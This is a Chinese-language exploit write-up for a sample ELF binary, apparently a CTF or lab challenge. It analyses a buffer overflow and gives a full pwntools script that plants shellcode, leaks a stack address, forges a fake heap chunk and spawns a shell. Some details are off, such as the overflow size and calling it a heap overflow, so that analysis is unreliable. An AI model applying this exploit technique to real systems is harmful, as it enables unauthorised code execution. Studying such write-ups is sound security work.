# 漏洞利用文档

## 执行环境
基于提供的反编译代码和调试记录分析，程序的执行环境如下：

- **二进制文件类型**：64位ELF可执行文件，动态链接
- **保护机制**：
  - **栈可执行**：允许在栈上执行shellcode（关键利用条件）
  - **无PIE**：程序基地址固定为0x400000，便于地址计算
  - **无栈保护**：未启用栈canary，允许栈溢出
  - **部分RELRO**：GOT表可写
- **依赖库**：标准C库（libc），通过动态链接加载
- **内存布局**：
  - 代码段：0x400000
  - 数据段/BSS：0x602000（全局变量ptr位于0x602080）
  - 堆：动态分配，初始地址约0x288cd000
  - 栈：地址随机化，但可通过泄露RBP计算具体位置
- **运行要求**：在Linux amd64环境下运行，需要标准输入输出

## 漏洞成因
### 关键结构体分析
程序使用全局变量`ptr`（地址0x602080）管理堆内存分配，结构如下：
```c
char *ptr; // 全局指针，用于存储malloc返回的地址
```

### 漏洞类型：堆溢出（Heap Overflow）
漏洞位于`sub_400A29()`函数中：
```c
int sub_400A29()
{
  char buf[56]; // 栈缓冲区，大小56字节
  char *dest;   // 堆指针
  
  dest = (char *)malloc(0x40u); // 分配64字节堆内存
  puts("give me money~");
  read(0, buf, 0x40u);         // 读取64字节到56字节缓冲区
  strcpy(dest, buf);           // 关键漏洞：无边界检查的复制
  ptr = dest;
  return sub_4009C4();
}
```

**漏洞具体分析**：
1. **缓冲区大小不匹配**：`buf`栈数组大小为56字节，但`read`读取64字节数据，导致栈溢出4字节
2. **strcpy不安全使用**：将栈缓冲区内容复制到堆时，无长度检查，可能复制超过64字节内容
3. **堆溢出后果**：溢出数据可能覆盖堆元数据（chunk header）或相邻chunk，结合程序中的free操作，可实现任意地址写

**漏洞触发路径**：
`main` → `sub_400A8E` → `sub_400A29` → `strcpy`溢出 → 后续通过菜单操作利用

## 漏洞利用过程
### 利用步骤概览
| 步骤 | 操作描述 | 关键内存变化 | 利用目的 |
|------|----------|-------------|----------|
| 1 | 泄露RBP计算shellcode地址 | 栈上注入shellcode，RBP值泄露 | 获取shellcode执行地址 |
| 2 | 设置fake chunk | 堆布局构造，全局变量ptr被修改 | 准备堆溢出利用环境 |
| 3 | 任意写操作 | 通过堆溢出修改ptr指向shellcode | 控制流劫持准备 |
| 4 | 触发shell执行 | 程序跳转到shellcode执行 | 获得shell权限 |

### 详细内存变化分析

#### 步骤1：信息泄露（leak_rbp_and_get_shellcode_addr）
- **栈状态变化**：
  - 初始：RBP=0x7ffefac41900, RSP=0x7ffefac418e8
  - 注入后：shellcode位于0x7ffefac41930-0x7ffefac41958
  - 关键：通过输入覆盖栈并读取RBP值，计算shellcode_addr = rbp_addr - 0x50

- **堆状态**：未分配，bins为空

#### 步骤2：堆布局设置（setup_fake_chunk）
- **栈状态**：RSP/RBP下移（0x7ffefac41878/0x7ffefac41890），shellcode保持稳定
- **堆状态**：分配chunk，通过构造fake chunk准备溢出
- **全局变量**：ptr从NULL(0x0)变为指向stdout(0x7a3fb8e0b620)，证明内存写入成功

#### 步骤3：任意地址写（arbitrary_write）
- **栈状态**：出现填充模式(0x61616161)和指向shellcode的指针(0x7ffefac41908处)
- **调用栈变化**：shellcode地址出现在调用栈#4位置
- **全局变量**：ptr被修改为指向shellcode地址（最终状态）

#### 步骤4：触发执行（trigger_shell）
- **程序状态**：从原始程序跳转到/bin/dash
- **内存映射**：完全切换，新进程空间建立
- **寄存器**：RIP/RSP/RBP全部更新为shell环境值

### 利用技术要点
1. **栈喷射**：将shellcode放置在栈上可执行区域
2. **地址泄露**：利用栈布局泄露关键地址信息
3. **堆风水**：通过fake chunk控制堆布局
4. **控制流劫持**：修改全局指针实现任意跳转

## Exploit
完整的漏洞利用脚本，关键位置添加注释：

```python
from pwn import *

# 设置调试环境和目标程序
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample21')
p = process('./data/sample21')

# 生成x64 shellcode
shellcode = asm(shellcraft.amd64.linux.sh(), arch='amd64')

def leak_rbp_and_get_shellcode_addr(shellcode):
    """
    步骤1: 泄露RBP并计算shellcode地址
    利用栈溢出泄露RBP值，计算shellcode在栈上的准确位置
    """
    payload = shellcode.ljust(48)  # 将shellcode填充到48字节
    p.sendafter(b'who are u?\n', payload)  # 注入shellcode到栈上
    p.recvuntil(payload)
    # 泄露RBP值（栈帧基址）
    rbp_addr = u64(p.recvn(6).ljust(8, b'\x00'))
    # 计算shellcode地址（基于栈布局）
    shellcode_addr = rbp_addr - 0x50
    print("shellcode_addr: ", hex(shellcode_addr))
    return shellcode_addr

def setup_fake_chunk(fake_chunk_addr):
    """
    步骤2: 设置fake chunk准备堆溢出
    构造假的堆chunk结构，为后续溢出利用做准备
    """
    p.sendlineafter(b'give me your id ~~?\n', b'32')  # 选择check in
    p.recvuntil(b'give me money~\n')
    # 构造fake chunk数据：4个qword(0) + size字段(0x41)
    data = p64(0) * 4 + p64(0) + p64(0x41)
    data = data.ljust(56, b'\x00') + p64(fake_chunk_addr)  # 填充并添加目标地址
    p.send(data)  # 发送构造的数据触发溢出

def arbitrary_write(shellcode_addr):
    """
    步骤3: 任意地址写操作
    通过堆溢出修改全局变量ptr指向shellcode地址
    """
    p.sendlineafter(b'choice : ', b'2')  # 选择check out
    p.sendlineafter(b'choice : ', b'1')  # 选择check in
    p.sendlineafter(b'long?', b'48')     # 设置分配大小
    p.recvline()
    # 构造溢出payload：填充 + shellcode地址
    data = b'a' * 0x18 + p64(shellcode_addr)
    data = data.ljust(48, b'\x00')  # 填充到48字节
    p.send(data)  # 发送数据触发堆溢出

def trigger_shell():
    """
    步骤4: 触发shell执行
    通过菜单选择触发控制流跳转到shellcode
    """
    p.sendlineafter(b'choice', b'3')  # 选择goodbye触发执行

# 执行利用流程
shellcode_addr = leak_rbp_and_get_shellcode_addr(shellcode)  # 步骤1: 泄露地址
fake_chunk_addr = shellcode_addr + 0x50 - 0x90  # 计算fake chunk地址
setup_fake_chunk(fake_chunk_addr)               # 步骤2: 堆布局
arbitrary_write(shellcode_addr)                 # 步骤3: 任意写
trigger_shell()                                 # 步骤4: 触发执行

# 交互模式，获得shell控制权
p.interactive()
```

### 关键利用技术说明
1. **地址计算**：基于泄露的RBP值，通过固定偏移计算shellcode位置
2. **堆溢出构造**：利用strcpy不检查边界的特性，覆盖堆元数据和全局变量
3. **控制流劫持**：通过修改ptr全局变量，将程序执行流重定向到shellcode
4. **栈可执行利用**：利用禁用NX保护的特性，直接在栈上执行shellcode

该漏洞利用成功演示了如何通过堆溢出结合栈执行权限获得完整的shell控制权。
